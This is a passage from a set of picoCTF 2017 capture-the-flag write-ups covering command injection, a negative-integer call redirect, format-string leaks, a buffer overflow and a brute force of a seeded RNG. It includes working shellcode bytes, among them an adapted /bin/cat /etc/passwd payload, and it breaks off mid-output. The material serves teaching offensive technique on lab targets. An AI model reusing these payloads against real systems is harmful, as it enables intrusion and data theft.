              //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
             //2           /     
            //                                   /      
           //                                   /       
          //                                   /        
         //                                   /         
        //                                   /          
       //___________________________________/           
      //                                                
     //                                                 
    //                                                  
   //                                                   
  //                                                    
 //  
```
Oh yeah, we've got system command execution.
 
# Step 2: Get flag
```bash
# nc shell2017.picoctf.com 37742
$(cat flag.txt)
               _                                        
              //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
             //697f4b6f43dc04baf91a01c7823f2412                    /     
            //                                   /      
           //                                   /       
          //                                   /        
         //                                   /         
        //                                   /          
       //___________________________________/           
      //                                                
     //                                                 
    //                                                  
   //                                                   
  //                                                    
 //  
```



### File: writeups/pico2017/guess-the-number/README.md

**Challenge name:** Guess The Number  
**Description:** Just a simple number-guessing game. How hard could it be? Binary Source. Connect on shell2017.picoctf.com:44930.  
**Hint:**  
What is the program doing with your input number?  
strtol checks for overflow, but it does allow negative numbers...  
**File(s) provided:**  
- guess_num (32-bit ELF)
- guess_num.c (source code)
----
# Step 0: Recon
It looks like the main function accepts a string, transforms it into a number, shifts it right, then tries to jump to the resulting number. The ```win``` function is present again as a target for us to reach.

# Step 1: Setting breakpoint
```gdb
# gdb guess_num -q
Reading symbols from guess_num...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x08048553 <+0>:	lea    ecx,[esp+0x4]
   0x08048557 <+4>:	and    esp,0xfffffff0
   0x0804855a <+7>:	push   DWORD PTR [ecx-0x4]
   0x0804855d <+10>:	push   ebp
   0x0804855e <+11>:	mov    ebp,esp
   0x08048560 <+13>:	push   ecx
   0x08048561 <+14>:	sub    esp,0x34
   0x08048564 <+17>:	mov    DWORD PTR [ebp-0x2c],0x0
   0x0804856b <+24>:	mov    ecx,0x0
   0x08048570 <+29>:	mov    eax,0x1c
   0x08048575 <+34>:	and    eax,0xfffffffc
   0x08048578 <+37>:	mov    edx,eax
   0x0804857a <+39>:	mov    eax,0x0
   0x0804857f <+44>:	mov    DWORD PTR [ebp+eax*1-0x28],ecx
   0x08048583 <+48>:	add    eax,0x4
   0x08048586 <+51>:	cmp    eax,edx
   0x08048588 <+53>:	jb     0x804857f <main+44>
   0x0804858a <+55>:	mov    eax,ds:0x8049a00
   0x0804858f <+60>:	sub    esp,0x8
   0x08048592 <+63>:	push   0x0
   0x08048594 <+65>:	push   eax
   0x08048595 <+66>:	call   0x80483b0 <setbuf@plt>
   0x0804859a <+71>:	add    esp,0x10
   0x0804859d <+74>:	sub    esp,0xc
   0x080485a0 <+77>:	push   0x80486ec
   0x080485a5 <+82>:	call   0x80483d0 <puts@plt>
   0x080485aa <+87>:	add    esp,0x10
   0x080485ad <+90>:	sub    esp,0xc
   0x080485b0 <+93>:	push   0x8048714
   0x080485b5 <+98>:	call   0x80483d0 <puts@plt>
   0x080485ba <+103>:	add    esp,0x10
   0x080485bd <+106>:	sub    esp,0xc
   0x080485c0 <+109>:	push   0x8048740
   0x080485c5 <+114>:	call   0x80483d0 <puts@plt>
   0x080485ca <+119>:	add    esp,0x10
   0x080485cd <+122>:	sub    esp,0xc
   0x080485d0 <+125>:	push   0x8048761
   0x080485d5 <+130>:	call   0x80483c0 <printf@plt>
   0x080485da <+135>:	add    esp,0x10
   0x080485dd <+138>:	sub    esp,0x8
   0x080485e0 <+141>:	lea    eax,[ebp-0x2c]
   0x080485e3 <+144>:	push   eax
---Type <return> to continue, or q <return> to quit---
   0x080485e4 <+145>:	push   0x8048775
   0x080485e9 <+150>:	call   0x8048410 <__isoc99_scanf@plt>
   0x080485ee <+155>:	add    esp,0x10
   0x080485f1 <+158>:	sub    esp,0x4
   0x080485f4 <+161>:	push   0xa
   0x080485f6 <+163>:	push   0x0
   0x080485f8 <+165>:	lea    eax,[ebp-0x2c]
   0x080485fb <+168>:	push   eax
   0x080485fc <+169>:	call   0x8048420 <strtol@plt>
   0x08048601 <+174>:	add    esp,0x10
   0x08048604 <+177>:	mov    DWORD PTR [ebp-0xc],eax
   0x08048607 <+180>:	sub    esp,0x8
   0x0804860a <+183>:	push   DWORD PTR [ebp-0xc]
   0x0804860d <+186>:	push   0x804877c
   0x08048612 <+191>:	call   0x80483c0 <printf@plt>
   0x08048617 <+196>:	add    esp,0x10
   0x0804861a <+199>:	shr    DWORD PTR [ebp-0xc],0x4
   0x0804861e <+203>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048621 <+206>:	call   eax
   0x08048623 <+208>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048626 <+211>:	leave  
   0x08048627 <+212>:	lea    esp,[ecx-0x4]
   0x0804862a <+215>:	ret    
End of assembler dump.
(gdb) break *0x08048621
Breakpoint 1 at 0x8048621
```
# Step 2: Find target address:
```gdb
(gdb) disas win
Dump of assembler code for function win:
   0x0804852b <+0>:	push   ebp
...
```
# Step 3: Calculate input
The program works like this:  
1) Accept a decimal number (let's call this ```input```)  
2) Which is be stored as bytes (let's call this ```temp```)  
3) This value is then shift right by 4 bits (let's call this ```target```) and is then jumped to  

Working backwards makes the most sense in this situation. Clearly our target is ```0x0804852b```.  
This means temp should be ```0x804852b0``` (shifted left 4 bits).
Finally, we need to know what decimal number to enter to get this ```temp``` value in memory. 

We can use gdb to place that value on the stack and just read it out in decimal form:
```gdb
(gdb) x/x $esp
0xffffcbf8:	0xffffcc48
(gdb) set *0xffffcbf8 = 0x804852b0
(gdb) print *0xffffcbf8
$1 = -2142743888
```
Our input has to be ```-2142743888```.
# Step 4: Get flag
``` bash
# nc shell2017.picoctf.com 44930
Welcome to the number guessing game!
I'm thinking of a number. Can you guess it?
Guess right and you get a shell!
Enter your number: -2142743888
You entered -2142743888. Let's see if it was right...
Congratulations! Have a shell:
/bin/sh: 0: can't access tty; job control turned off
$ ls
flag.txt
guess_num
xinetd_wrapper.sh
$ cat flag.txt	
55b6b9591d1781061f859a010a8fe0ef
```



### File: writeups/pico2017/ive-got-a-secret/README.md

**Challenge name:** Ive Got A Secret  
**Description:** Hopefully you can find the right format for my secret! Source. Connect on shell2017.picoctf.com:58570.  
**Hint:** This is a beginning format string attack.    
**File(s) provided:**  
- secret (32-bit ELF)
- secret.c (source code)
----
# Step 0: Recon
The program accepts input twice; the first time it just repeats the input, the second time it will compare it to a random value. If the guess is correct, the flag is printed. We will use the format string vulnerability in the first stage to leak the value needed for the second.

# Step 1: Confirm the format tring vulnerability
```bash
# python -c 'print "%08x."*12' | ./secret
Give me something to say!
00000040.f77575a0.08048792.00000001.ff9db254.4a3e03ac.00000003.f77573dc.ff9db1c0.00000000.f75bc276.00000001.
Now tell my secret in hex! Secret: As my friend says,"You get nothing! You lose! Good day, Sir!"
```
Note: we read 12 stack values, because the input buffer is 64 bits and we're using 5 bytes per stack value. It is possible to be more efficient (just using ```%x```) and read more values, but it is unlikely that we need to.

# Step 2: Find secret value
If we run the script a couple times, we should be able to see which value is random:
```bash
# for i in {1..10}; do python -c 'print "%08x."*12' | ./secret; done
Give me something to say!
00000040.f779c5a0.08048792.00000001.ff857c54.85278f47.00000003.f779c3dc.ff857bc0.00000000.f7601276.00000001.
Now tell my secret in hex! Secret: As my friend says,"You get nothing! You lose! Good day, Sir!"
Give me something to say!
00000040.f775f5a0.08048792.00000001.ffdd0814.47e3d221.00000003.f775f3dc.ffdd0780.00000000.f75c4276.00000001.
Now tell my secret in hex! Secret: As my friend says,"You get nothing! You lose! Good day, Sir!"
Give me something to say!
00000040.f76f75a0.08048792.00000001.ffd8fa04.a4d7c407.00000003.f76f73dc.ffd8f970.00000000.f755c276.00000001.
Now tell my secret in hex! Secret: As my friend says,"You get nothing! You lose! Good day, Sir!"
Give me something to say!
00000040.f76b65a0.08048792.00000001.ffe24ea4.aa595cdc.00000003.f76b63dc.ffe24e10.00000000.f751b276.00000001.
Now tell my secret in hex! Secret: As my friend says,"You get nothing! You lose! Good day, Sir!"
Give me something to say!
00000040.f76ef5a0.08048792.00000001.ffa3e8c4.34aeca22.00000003.f76ef3dc.ffa3e830.00000000.f7554276.00000001.
Now tell my secret in hex! Secret: As my friend says,"You get nothing! You lose! Good day, Sir!"
Give me something to say!
00000040.f77a85a0.08048792.00000001.ffbb6114.94ffefe8.00000003.f77a83dc.ffbb6080.00000000.f760d276.00000001.
Now tell my secret in hex! Secret: As my friend says,"You get nothing! You lose! Good day, Sir!"
Give me something to say!
00000040.f77675a0.08048792.00000001.fffa8674.ff3453d7.00000003.f77673dc.fffa85e0.00000000.f75cc276.00000001.
Now tell my secret in hex! Secret: As my friend says,"You get nothing! You lose! Good day, Sir!"
Give me something to say!
00000040.f77375a0.08048792.00000001.ff99d884.77e2e584.00000003.f77373dc.ff99d7f0.00000000.f759c276.00000001.
Now tell my secret in hex! Secret: As my friend says,"You get nothing! You lose! Good day, Sir!"
Give me something to say!
00000040.f76c15a0.08048792.00000001.ffc37314.080bc9b6.00000003.f76c13dc.ffc37280.00000000.f7526276.00000001.
Now tell my secret in hex! Secret: As my friend says,"You get nothing! You lose! Good day, Sir!"
Give me something to say!
00000040.f774c5a0.08048792.00000001.ffc6ec94.ce0b466a.00000003.f774c3dc.ffc6ec00.00000000.f75b1276.00000001.
Now tell my secret in hex! Secret: As my friend says,"You get nothing! You lose! Good day, Sir!"
```
It looks like the 6th value changes every time we run it, so it is likely to be the value we need.
# Step 3: Get flag
Let's make input that makes it easier for us to extract the secret value:  ```%x%x%x%x%x....%08x```  
- 5 ```%x``` because we don't care about the first 5 values
- a couple of dots to mark the separation
- ```%08x``` to pad the secret value with leading zeroes if needed  

Connect to the service, give it the input above, and copy/paste the value after the dots:
``` bash
# nc shell2017.picoctf.com 58570
Give me something to say!
%x%x%x%x%x....%08x
40f7fc7c2080487921ffffdd34....7903523c
Now tell my secret in hex! Secret: 7903523c
326edd4743c7046d72d29e911ae8a412
Wow, you got it!
```
# Step 4: Sidenote
If you want to use python to generate the first input and manually enter the second one, you'll need to keep the pipe open. That can be done as follows:
``` bash
# cat <(python -c 'print "%08x."*6') - | ./secret
```



### File: writeups/pico2017/shells/README.md

**Challenge name:** Shells  
**Description:** How much can a couple bytes do? Use shells! Source. Connect on shell2017.picoctf.com:58279.  
**Hint:** Read about basic shellcode  
You don't need a full shell (yet...), just enough to get the flag  
**File(s) provided:**  
- shells (ELF 32-bit binary)
- shells.c (source code)

---
# Step 0: Recon
Similar to shellz. In this case, we only get to execute 10 bytes worth of shellcode. Luckily, there is now a function (```void win()```) that does what we need. All we need to do is feed it some shellcode that jumps to that function.

# Step 1: Create shellcode
First, let's figure out the address of where we need to jump to. It's likely that ASLR is disabled anyway.
```bash
# gdb shells -q
Reading symbols from shells...(no debugging symbols found)...done.
(gdb) disas win
Dump of assembler code for function win:
   0x08048540 <+0>:	push   %ebp
...
```
Our shellcode should look like this:
``` asm
mov eax, 0x08048540
call eax
```
Note: my first try was to run ``` call 0x08048540```, but the nasm_shell output (see next step) didn't work in gdb.

# Step 2: Assemble the shellcode
To get the instruction bytes for shellcode, we are going to use metasploit's nasm_shell:
``` bash
# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
nasm > mov eax, 0x08048540
00000000  B840850408        mov eax,0x8048540
nasm > call eax
00000000  FFD0              call eax
```
To pass this shellcode to the binary, we can use python:
``` bash
# python -c 'print "\xB8\x40\x85\x04\x08\xFF\xD0"'
```
# Step 3: Test locally
First, we create a test flag file.
Next, we set a breakpoint at the right point (```call *%eax```):
``` bash
# gdb shells -q
Reading symbols from shells...(no debugging symbols found)...done.
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x08048560 <+0>:	push   %ebp
   0x08048561 <+1>:	mov    %esp,%ebp
   0x08048563 <+3>:	sub    $0x18,%esp
   0x08048566 <+6>:	sub    $0x8,%esp
   0x08048569 <+9>:	push   $0x0
   0x0804856b <+11>:	push   $0x0
   0x0804856d <+13>:	push   $0x22
   0x0804856f <+15>:	push   $0x7
   0x08048571 <+17>:	push   $0xa
   0x08048573 <+19>:	push   $0x0
   0x08048575 <+21>:	call   0x8048420 <mmap@plt>
   0x0804857a <+26>:	add    $0x20,%esp
   0x0804857d <+29>:	mov    %eax,-0xc(%ebp)
   0x08048580 <+32>:	cmpl   $0xffffffff,-0xc(%ebp)
   0x08048584 <+36>:	jne    0x80485a0 <vuln+64>
   0x08048586 <+38>:	sub    $0xc,%esp
   0x08048589 <+41>:	push   $0x8048714
   0x0804858e <+46>:	call   0x80483e0 <puts@plt>
   0x08048593 <+51>:	add    $0x10,%esp
   0x08048596 <+54>:	sub    $0xc,%esp
   0x08048599 <+57>:	push   $0x0
   0x0804859b <+59>:	call   0x8048410 <exit@plt>
   0x080485a0 <+64>:	sub    $0x8,%esp
   0x080485a3 <+67>:	push   $0xa
   0x080485a5 <+69>:	push   $0x804873e
   0x080485aa <+74>:	call   0x80483c0 <printf@plt>
   0x080485af <+79>:	add    $0x10,%esp
   0x080485b2 <+82>:	mov    0x8049a60,%eax
   0x080485b7 <+87>:	sub    $0xc,%esp
   0x080485ba <+90>:	push   %eax
   0x080485bb <+91>:	call   0x80483d0 <fflush@plt>
   0x080485c0 <+96>:	add    $0x10,%esp
   0x080485c3 <+99>:	sub    $0x4,%esp
   0x080485c6 <+102>:	push   $0xa
   0x080485c8 <+104>:	pushl  -0xc(%ebp)
   0x080485cb <+107>:	push   $0x0
   0x080485cd <+109>:	call   0x80483b0 <read@plt>
   0x080485d2 <+114>:	add    $0x10,%esp
   0x080485d5 <+117>:	mov    %eax,-0x10(%ebp)
   0x080485d8 <+120>:	cmpl   $0x0,-0x10(%ebp)
   0x080485dc <+124>:	jne    0x80485f8 <vuln+152>
   0x080485de <+126>:	sub    $0xc,%esp
---Type <return> to continue, or q <return> to quit---
   0x080485e1 <+129>:	push   $0x8048754
   0x080485e6 <+134>:	call   0x80483c0 <printf@plt>
   0x080485eb <+139>:	add    $0x10,%esp
   0x080485ee <+142>:	sub    $0xc,%esp
   0x080485f1 <+145>:	push   $0x0
   0x080485f3 <+147>:	call   0x8048410 <exit@plt>
   0x080485f8 <+152>:	mov    -0xc(%ebp),%eax
   0x080485fb <+155>:	mov    %eax,-0x14(%ebp)
   0x080485fe <+158>:	mov    -0x14(%ebp),%eax
   0x08048601 <+161>:	call   *%eax
   0x08048603 <+163>:	leave  
   0x08048604 <+164>:	ret    
End of assembler dump.
(gdb) break *0x08048601
Breakpoint 1 at 0x8048601
```
Let's run the binary in gdb with the right input. Note how you can still call python from within gdb.
``` bash
(gdb) run < <(python -c 'print "\xB8\x40\x85\x04\x08\xFF\xD0"')
Starting program: /mnt/hgfs/Shared/ctf/pico2017/shells/shells < <(python -c 'print "\xB8\x40\x85\x04\x08\xFF\xD0"')
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 10 bytes:

Breakpoint 1, 0x08048601 in vuln ()
```
We are at the point just before the shellode is executed. Let's inspect memory and the instructions to be executed.
``` bash
(gdb) si
0xf7ffb000 in ?? ()
(gdb) x/2x $eip
0xf7ffb000:	0x048540b8	0x0ad0ff08
(gdb) x/2i $eip
=> 0xf7ffb000:	mov    $0x8048540,%eax
   0xf7ffb005:	call   *%eax
```
Looks good. Continuing shows that the test flag file is indeed read.
``` bash
(gdb) c
Continuing.
test

Program received signal SIGSEGV, Segmentation fault.
0xf7ffb007 in ?? ()
```
# Step 5: Get flag
``` bash
# python -c 'print "\xB8\x40\x85\x04\x08\xFF\xD0"' | nc shell2017.picoctf.com 58279
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 10 bytes:
84f1e856de605076057b0687dfd0865f
```



### File: writeups/pico2017/shellz/README.md

**Challenge name:** Shellz  
**Description:** You no longer have an easy thing to call, but you have more space. Program: shellz! Source. Connect on shell2017.picoctf.com:6942.  
**Hint:** There is a bunch of preexisting shellcode already out there!  
**File(s) provided:**  
- shellz (ELF 32-bit binary)
- shellz.c (source code)

---
# Step 0: Recon
They've given us a binary that reads up to 40 bytes and executes it. We can solve the challenge by sending it shellcode to read the flag (assuming we can get it to fit inside 40 bytes).

# Step 1 : Find shellcode to read a file
The following shellcode reads ```/etc/passwd``` and is 43 bytes long. The size is not a problem because we need to read "flag.txt" which is 4 bytes shorter than "/etc/passwd", meaning we'll need 5 bytes less (4 bytes for the text, 1 byte for the push instruction). 
``` python
s = ''
s += "\x31\xc0"			# xorl %eax,%eax
s += "\x99" 			# cdq
s += "\x52" 			# push edx
s += "\x68\x2f\x63\x61\x74" 	# push dword 0x7461632f
s += "\x68\x2f\x62\x69\x6e" 	# push dword 0x6e69622f
s += "\x89\xe3" 		# mov ebx,esp
s += "\x52" 			# push edx
s += "\x68\x73\x73\x77\x64" 	# push dword 0x64777373
s += "\x68\x2f\x2f\x70\x61" 	# push dword 0x61702f2f
s += "\x68\x2f\x65\x74\x63"	# push dword 0x6374652f
s += "\x89\xe1" 		# mov ecx,esp
s += "\xb0\x0b" 		# mov $0xb,%al
s += "\x52" 			# push edx
s += "\x51" 			# push ecx
s += "\x53" 			# push ebx
s += "\x89\xe1" 		# mov ecx,esp
s += "\xcd\x80"  		# int 80h
```
Linux/x86 - bin/cat /etc/passwd - 43 bytes  
Source: http://shell-storm.org/shellcode/files/shellcode-571.php

# Step 2: Inspect the shellcode
First, we need to find where the file is specified. This is the relevant part:
``` python
s += "\x68\x73\x73\x77\x64" 	# push dword 0x64777373
s += "\x68\x2f\x2f\x70\x61" 	# push dword 0x61702f2f
s += "\x68\x2f\x65\x74\x63"	# push dword 0x6374652f
```
The first byte (```\x68```) for each of these lines is for the push instruction; the rest 4 bytes are the data being pushed.

Data:
```
73737764  
2f2f7061  
2f657463  
```
ASCII hex decode:
```
sswd  
//pa  
/etc  
```
I'm not sure why you need 2 slashes, but it won't matter because we don't need slashes anyway.

# Step 3: Edit the shellcode
Based on the example above, we want to encode the following:
```
.txt  
flag  
```
ASCII hex encoded:
```
2E747874  
666C6167  
```
The relevant lines of the shellcode become (don't forget the instruction byte):
``` python
s += "\x68\x2e\x74\x78\x74" 	# push dword ".txt"
s += "\x68\x66\x6c\x61\x67"	# push dword "flag"
```

# Step 4: Test locally
Create a ```flag.txt``` file with some test data inside.
Copy the shellcode into a python file to print it, then pass that output to the binary.

``` bash
# python shellcode.py |./shellz
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 40 bytes:
test
```

# Step 5: Execute to get flag
```bash
# python shellcode.py | nc shell2017.picoctf.com 6942
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 40 bytes:
4effa67d6909029fd3cc45600f024e3f
```



### File: writeups/pico2017/sorandom/README.md

**Challenge name:** SoRandom      
**Description:** We found sorandom.py running at shell2017.picoctf.com:55248. It seems to be outputting the flag but randomizing all the characters first. Is there anyway to get back the original flag?
Update (text only) 16:16 EST 1 Apr Running python 2 (same version as on the server)    
**Hint:** How random can computers be?      
**File(s) provided:**      
- sorandom.py     
---
# Step 0: Recon
From the soure code, we can tell that a file is being read and then each character of the flag is encoded using some "random" numbers. We could try to reverse engineer the encoding and the predictable randomness to work backwards, but instead we'll treat it like a black-box and bruteforce it, one character at a time. This approach would be of linear complexity anyway.

# Step 1: Make a function that can encode input
Just copy the code into a function and make sure the randomness seed is set each time the function is run:
```python
def encode(flag):
	'''Encode the input. Copied verbatim from challenge.'''
	random.seed("random")
	encflag = ""
	for c in flag:
	  if c.islower():
	    #rotate number around alphabet a random amount
	    encflag += chr((ord(c)-ord('a')+random.randrange(0,26))%26 + ord('a'))
	  elif c.isupper():
	    encflag += chr((ord(c)-ord('A')+random.randrange(0,26))%26 + ord('A'))
	  elif c.isdigit():
	    encflag += chr((ord(c)-ord('0')+random.randrange(0,10))%10 + ord('0'))
	  else:
	    encflag += c
	return encflag
```

# Step 2: Create the main function
First we grab the target output from the server:
```bash
# nc shell2017.picoctf.com 55248
Unguessably Randomized Flag: BNZQ:1o0yd5jk9h256wdjsu366t10787198h9
```
For each of the target characters, we need to find the character that encodes into it. We'll add a helper function ```find_char``` to keep the code readable, which we'll define in the next step:
```python
if __name__ == "__main__":
	# the GOAL output we got from the server
	GOAL = 'BNZQ:1o0yd5jk9h256wdjsu366t10787198h9'

	# start from "FLAG:" and keep adding the characters that match the ones in GOAL
	myflag = "FLAG:"
	for c in GOAL[5:]:
		myflag = find_char(c, myflag)
		print myflag
		# error handling
		if myflag == None:
			print "error: char not found"
			exit()
```


# Step 3: Create helper function
This function takes the WIP-input and the target character as inputs. It will then try all 256 ACII characters and see if it is the correct one. If it finds the right one, it returns the new WIP flag:
```python
def find_char(c, myflag):
	'''
	Find the character that needs to be added to myflag for the last character to match c.
	Then return the updated myflag
	'''
	for temp in range(256):
		temp_c = chr(temp)
		temp_enc = encode(myflag+temp_c)
		if temp_enc[-1] == c:
			return myflag+temp_c
```

# Step 4: Get flag
```bash
# python sorandom_solve.py 
FLAG:8
FLAG:8d
FLAG:8d8
FLAG:8d8c
FLAG:8d8ca
FLAG:8d8ca6
FLAG:8d8ca6d
FLAG:8d8ca6db
FLAG:8d8ca6db4
FLAG:8d8ca6db4f
FLAG:8d8ca6db4f5
FLAG:8d8ca6db4f51
FLAG:8d8ca6db4f519
FLAG:8d8ca6db4f519e
FLAG:8d8ca6db4f519ed
FLAG:8d8ca6db4f519ede
FLAG:8d8ca6db4f519edea
FLAG:8d8ca6db4f519edeab
FLAG:8d8ca6db4f519edeab4
FLAG:8d8ca6db4f519edeab49
FLAG:8d8ca6db4f519edeab492
FLAG:8d8ca6db4f519edeab492d
FLAG:8d8ca6db4f519edeab492d5
FLAG:8d8ca6db4f519edeab492d55
FLAG:8d8ca6db4f519edeab492d552
FLAG:8d8ca6db4f519edeab492d5520
FLAG:8d8ca6db4f519edeab492d55203
FLAG:8d8ca6db4f519edeab492d552034
FLAG:8d8ca6db4f519edeab492d5520346
FLAG:8d8ca6db4f519edeab492d55203467
FLAG:8d8ca6db4f519edeab492d55203467d
FLAG:8d8ca6db4f519edeab492d55203467d9
```



### File: writeups/pico2017/vrgearconsole/README.md

**Challenge name:** VR Gear Console      
**Description:** Here's the VR gear admin console. See if you can figure out a way to log in. The problem is found here: /problems/51645e84d55d376442beaf264e0908b9    
**Hint:**     
- What happens if you read in more characters than the length of the username buffer?  
- You should look at an ascii table to see what character you need to choose.  
- Numbers are stored in little-endian format, which means that the lowest byte of the number is first.  
- "cat file - | vrgearconsole " will keep the pipe open for commands.  

**File(s) provided:**      
- vrgearconsole (32-bit setgid ELF)    
- vrgearconsole.c (source code)     
---
# Step 0: Recon

First off, it should be noted that the source code or this challenge does not entirely match the binary. When you intentially fail the login, you get the "Login unsuccessful." message. But looking at the code it never says this (it contains "Login successful" though)...
``` bash
# ./vrgearconsole
+----------------------------------------+
|                                        |
|                                        |
|                                        |
|                                        |
|  Welcome to the VR gear admin console  |
|                                        |
|                                        |
|                                        |
|                                        |
+----------------------------------------+
|                                        |
|      Your account is not recognized    |
|                                        |
+----------------------------------------+




Please login to continue...


Username (max 15 characters): a
Password (max 31 characters): a
Your access level is: 0x000000ff
Login unsuccessful.
# grep "suc" vrgearconsole.c 
        printf("Login successful.\n");
```
Anyway, just keep this in mind when you solve it.

The program does the following:  
- read in username (using ```gets```)  
- read in password (using ```gets```) 
- determine accessLevel  
- spawn a shell if accessLevel is correct  

If we can overflow the buffers for username and/or password, we should be able to set accessLevel to whatever we want.

# Step 1: Look at the internals
We could figure out the internals by just fuzzing this, but let's take the methodical approach instead.
```gdb
# gdb vrgearconsole -q
Reading symbols from vrgearconsole...(no debugging symbols found)...done.
(gdb) disas login
Dump of assembler code for function login:
<snip>
   0x0804855b <+32>:	lea    eax,[ebp-0x1c]
   0x0804855e <+35>:	push   eax
   0x0804855f <+36>:	call   0x80483e0 <gets@plt>
   0x08048564 <+41>:	add    esp,0x10
   0x08048567 <+44>:	sub    esp,0xc
   0x0804856a <+47>:	push   0x80487d0
   0x0804856f <+52>:	call   0x80483d0 <printf@plt>
   0x08048574 <+57>:	add    esp,0x10
   0x08048577 <+60>:	sub    esp,0xc
   0x0804857a <+63>:	lea    eax,[ebp-0x3c]
   0x0804857d <+66>:	push   eax
   0x0804857e <+67>:	call   0x80483e0 <gets@plt>
   0x08048583 <+72>:	add    esp,0x10
  <snip>
   0x0804862f <+244>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048632 <+247>:	leave  
   0x08048633 <+248>:	ret    
End of assembler dump.
```
We can see that the username is stored at ```[ebp-0x1c]```, the password at ```[ebp-0x3c]```, and accessLevel at ```[ebp-0xc]```. Luckily for us, accessLevel is stored in a higher memory location than the other 2 variables, so we can indeed overwrite it. If this wasn't the case, we could still overwrite the return address and turn this in a classic buffer overflow exercise. Overwriting acessLevel is easier though, so we'll do that.

Let's have a look at the memory just after the second ```gets``` (username = "aaaa", password = "bbbb"):
```gdb
(gdb) break *0x08048583
Breakpoint 1 at 0x8048583
(gdb) run
Starting program: /mnt/hgfs/Shared/ctf/pico2017/vrgearconsole/vrgearconsole 
+----------------------------------------+
|                                        |
|                                        |
|                                        |
|                                        |
|  Welcome to the VR gear admin console  |
|                                        |
|                                        |
|                                        |
|                                        |
+----------------------------------------+
|                                        |
|      Your account is not recognized    |
|                                        |
+----------------------------------------+




Please login to continue...


Username (max 15 characters): aaaa
Password (max 31 characters): bbbb

Breakpoint 1, 0x08048583 in login ()
(gdb) x/32xw $esp
0xffffd280:	0xffffd29c	0xf7fac000	0xffffd2c8	0xf7e58a1b
0xffffd290:	0xf7facd60	0x0000000a	0x000002a6	0x62626262
0xffffd2a0:	0xf7fe7800	0x00000000	0x000007d4	0xfbad2887
0xffffd2b0:	0xffffd2f8	0xf7fedf50	0xf7e5887b	0x61616161
0xffffd2c0:	0x00000000	0xf7fac000	0xffffd2f8	0x000000ff
0xffffd2d0:	0x08048860	0x00000000	0xffffd2f8	0x0804866d
0xffffd2e0:	0x00000001	0xffffd3a4	0xffffd3ac	0xf7e27a2b
0xffffd2f0:	0xf7fac3dc	0xffffd310	0x00000000	0xf7e11276
(gdb) i r ebp
ebp            0xffffd2d8	0xffffd2d8
```
We can see ```0x62626262```, ```0x61616161```, and ```0x000000ff``` at the expected memory locations (all in right most column).

# Step 2: Finding the right value to overwrite accessLevel with
Since we can't rely on the source code or this part, we need to reverse engineer the binary itself to figure out the logic. I've annotated the code blocks for the last part of ```main```:
```gdb
login():
   0x08048668 <+52>:	   call   0x804853b <login>
   0x0804866d <+57>:	   mov    DWORD PTR [ebp-0xc],eax

print accessLevel:
   0x08048670 <+60>:	   sub    esp,0x8
   0x08048673 <+63>:	   push   DWORD PTR [ebp-0xc]
   0x08048676 <+66>:	   push   0x8048b07
   0x0804867b <+71>:	   call   0x80483d0 <printf@plt>

if accessLevel > 0xfe, jmp +94:
   0x08048680 <+76>:	   add    esp,0x10
   0x08048683 <+79>:	   cmp    DWORD PTR [ebp-0xc],0xfe
   0x0804868a <+86>:	   jg     0x8048692 <main+94>

if accessLevel > 0, jmp +120:
   0x0804868c <+88>:	   cmp    DWORD PTR [ebp-0xc],0x0
   0x08048690 <+92>:	   jg     0x80486ac <main+120>

+94: "Login unsuccessful" + exit:
   0x08048692 <+94>:	   sub    esp,0xc
   0x08048695 <+97>:	   push   0x8048b25
   0x0804869a <+102>:	call   0x80483f0 <puts@plt>
   0x0804869f <+107>:	add    esp,0x10
   0x080486a2 <+110>:	sub    esp,0xc
   0x080486a5 <+113>:	push   0xa
   0x080486a7 <+115>:	call   0x8048420 <exit@plt>

+120: if accessLevel > 0x2f, jmp +176:
   0x080486ac <+120>:	cmp    DWORD PTR [ebp-0xc],0x2f
   0x080486b0 <+124>:	jg     0x80486e4 <main+176>

print "Admin access granted" + spawn shell:
   0x080486b2 <+126>:	sub    esp,0xc
   0x080486b5 <+129>:	push   0x8048b39
   0x080486ba <+134>:	call   0x80483f0 <puts@plt>
   0x080486bf <+139>:	add    esp,0x10
   0x080486c2 <+142>:	sub    esp,0xc
   0x080486c5 <+145>:	push   0x8048b4f
   0x080486ca <+150>:	call   0x80483f0 <puts@plt>
   0x080486cf <+155>:	add    esp,0x10
   0x080486d2 <+158>:	sub    esp,0xc
   0x080486d5 <+161>:	push   0x8048b6a
   0x080486da <+166>:	call   0x8048400 <system@plt>
   0x080486df <+171>:	add    esp,0x10
   0x080486e2 <+174>:	jmp    0x804870e <main+218>

+176: "don't have permission" + exit
   0x080486e4 <+176>:	sub    esp,0xc
   0x080486e7 <+179>:	push   0x8048b72
   0x080486ec <+184>:	call   0x80483f0 <puts@plt>
   0x080486f1 <+189>:	add    esp,0x10
   0x080486f4 <+192>:	sub    esp,0xc
   0x080486f7 <+195>:	push   0x8048b84
   0x080486fc <+200>:	call   0x80483f0 <puts@plt>
   0x08048701 <+205>:	add    esp,0x10
   0x08048704 <+208>:	sub    esp,0xc
   0x08048707 <+211>:	push   0x1
   0x08048709 <+213>:	call   0x8048420 <exit@plt>

+218: function epilogue
   0x0804870e <+218>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048711 <+221>:	leave  
   0x08048712 <+222>:	lea    esp,[ecx-0x4]
   0x08048715 <+225>:	ret    
```
In order to hit the right part of the code, accessLevel should be between ```0x0``` and ```0x2f``` (bounds not included); the space character (```0x20```) falls in this range. If we use make the username just long enough to put a single space in the accessLevel memory location (16 garbage bytes followed by a single space), we should get Admin access.

# Step 3: Get flag
``` bash
de_lille_d@shell-web:/problems/51645e84d55d376442beaf264e0908b9$ ./vrgearconsole                   
+----------------------------------------+                                                         
|                                        |                                                         
|                                        |                                                         
|                                        |                                                         
|                                        |                                                         
|  Welcome to the VR gear admin console  |                                                         
|                                        |                                                         
|                                        |                                                         
|                                        |                                                         
|                                        |                                                         
+----------------------------------------+                                                         
|                                        |                                                         
|      Your account is not recognized    |                                                         
